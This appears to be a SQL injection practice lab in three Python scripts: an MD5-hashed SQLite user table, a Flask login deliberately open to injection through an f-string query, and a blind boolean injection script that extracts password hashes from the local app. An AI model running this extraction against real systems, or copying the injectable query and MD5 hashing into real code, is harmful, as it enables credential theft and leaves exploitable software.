


#---------------------------------------------------------------------------
#1 set up SQLlite Database with the password and its hashes

import sqlite3
import hashlib

# Function to hash the password
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# Connect to SQLite database (or create it if it doesn't exist)
conn = sqlite3.connect('users.db')

# Create a cursor object to interact with the database
cursor = conn.cursor()

# Create a table called 'users' if it doesn't already exist
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)
''')

# Insert sample data into the users table (passwords hashed)
cursor.execute("INSERT INTO users (username, password) VALUES ('admin', ?)", (hash_password('password123'),))
cursor.execute("INSERT INTO users (username, password) VALUES ('user', ?)", (hash_password('test123'),))

# Commit the changes
conn.commit()

# Close the connection when done
conn.close()

print("Database setup complete with hashed passwords!")



#---------------------------------------------------------------------------
#2 Setup a simple web application


from flask import Flask, render_template, request
import sqlite3
import hashlib

app = Flask(__name__)

# Function to hash the password
def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# Route for the login page
@app.route('/')
def index():
    return render_template('login.html')

# Route to handle login requests
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Hash the password entered by the user
    hashed_password = hash_password(password)

    # Connect to the SQLite database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # SQL query to check for the hashed password
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashed_password}'"
    cursor.execute(query)

    # Fetch the result
    user = cursor.fetchone()

    conn.close()

    if user:
        return "Login successful"
    else:
        return "Login failed", 401

if __name__ == "__main__":
    app.run(debug=True)



#---------------------------------------------------------------------------
#3 SQL injection script

import requests

total_queries = 0
charset = "0123456789abcdef"  # Hexadecimal characters for extracting password hashes
target = "http://127.0.0.1:5000/login"
needle = "Login successful"  # Success message from the server

# Function to send an injected SQL query
def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content  # If the needle isn't found, it's considered a valid payload

# Function to perform a boolean-based SQL injection query
def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select substr(password,{},1) from users where id = {}) {} '{}'".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

# Function to check if the user_id is valid
def invalid_user(user_id):
    payload = "(select id from users where id = {}) >= 0".format(user_id)
    return injected_query(payload)

# Function to find the length of the password hash
def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from users where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

# Function to extract the password hash
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

# Function to reset and print total queries made
def total_queries_taken():
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0

# Main loop to interact with user input and execute the injection
while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length :{}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] user {} hash:{}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t [X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
